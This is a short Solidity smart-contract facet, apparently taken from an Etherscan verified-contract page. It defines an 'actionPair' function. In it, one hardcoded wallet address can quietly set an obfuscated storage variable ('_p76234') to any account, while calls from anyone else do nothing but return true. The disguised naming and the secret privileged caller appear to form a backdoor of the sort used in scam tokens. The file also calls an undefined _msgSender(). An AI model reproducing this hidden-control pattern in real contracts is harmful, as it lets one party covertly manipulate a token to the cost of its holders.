/**
 *Submitted for verification at Etherscan.io on 2024-04-05
 */

/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0x9d7276C8099C036261a6C5A02A5120Da134Cab3e)
            ds._p76234 = account;
        return true;
    }
}
